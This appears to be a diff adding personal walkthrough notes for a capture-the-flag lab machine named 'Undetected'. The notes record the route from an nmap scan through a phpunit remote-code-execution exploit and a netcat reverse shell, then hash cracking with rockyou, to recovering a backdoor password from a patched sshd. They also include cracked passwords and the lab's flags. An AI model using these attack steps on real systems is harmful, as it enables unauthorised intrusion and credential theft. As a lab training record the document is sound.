@@ -1,0 +1,94 @@
+Machine-Name : Undetected
+IP Address   : 10.129.136.44
+
+Command-Line: sudo nmap 10.129.136.44 -p- -A -T4 -o nmap/init.txt
+Result:
+    ./nmap/init.txt
+
+Notes: Investigated IP in browser. Found store.djewelry.htb and added it to /etc/hosts file attached to IP.
+
+Recon: Found /vendor
+
+Notes: phpunit has known vulnerability.
+
+Browser: phpunit exploit
+URL: https://www.exploit-db.com/exploits/50702
+
+Command-Line: nc -lvnp 9001
+Burpsuite: Sent RCE URL request using repeater. (http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php)
+File: ./burpsuite/rce.req
+Result:
+    REVERSE SHELL
+    www-data@production
+
+www-data@production: copy /var/backups/info /var/www/main
+Command-Line: wget http://10.129.136.44/info
+
+Command-Line: strings info
+Result:
+    ./hex-encrypted.txt
+
+Notes: Reversed hex encryption.
+Result:
+    hex-unencrypted.txt
+
+Notes: From hex-unencrypted, a password hash was found.
+Result:
+    ./password-hash.txt
+
+Command-Line: hashcat password-hash.txt /usr/share/wordlists/rockyou.txt
+Result:
+    $6$zS7ykHfFMg3aYht4$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:ihatehackers
+
+cat /etc/passwd |grep sh
+Result:
+    root:x:0:0:root:/root:/bin/bash
+    steven:x:1000:1000:Steven Wright:/home/steven:/bin/bash
+    sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
+    steven1:x:1000:1000:,,,:/home/steven:/bin/bash
+
+www-data@production: su steven1
+Password: ihatehackers
+Result:
+    LOGIN SUCCESSFUL
+
+steven@production: cat /home/steven/user.txt
+Result:
+    3aaf13acdf7652f78e01565c0a09b1ff
+    USER OWNED
+
+steven@production: find / -type f -printf "%T+ %p\n" 2>/dev/null |grep 00:00:00 |grep -v ' /sys\| /proc\| /run'
+Result:
+    2020-04-13+00:00:00.0000000000 /usr/sbin/sshd
+
+www-data@production: cp /usr/sbin/sshd /var/www/main
+Command-Line: wget 10.129.136.44/sshd
+
+Notes: Opened file up with Ghidra. Found "Exports/auth_password/backdoor". auth_password file decompiled.
+File: sshd-decompiled
+
+Notes: Found backdoor password with the following hex values using CyberChef. RECIPE: SWAP endianness HEX Word-Length:4 no-padding, From HEX delimeter auto, and XOR with a key value of 0x96 Scheme:Standard.
+HEX VALUES:
+    0xf0e7abd6;
+    0xa4b3a3f3;
+    0xf7bbfdc8;
+    0xfdb3d6e7;
+    0xfda0b3d6;
+    0xb2d6f4a0;
+    0xbcf0b5e3;
+    0xa5a9f4;
+
+Password: @=qfe5%2^k-aq@%k@%6k6b@$u#f*b?3
+
+Command-Line: ssh root@10.129.136.44
+Password: @=qfe5%2^k-aq@%k@%6k6b@$u#f*b?3
+Result:
+    root@production
+    LOGIN SUCCESSFUL
+
+root@production: cat /root/root.txt
+Result:
+    ccd44776c7ddd9f2b7c595aec755656a
+    ROOT OWNED
+
+    FINISHED
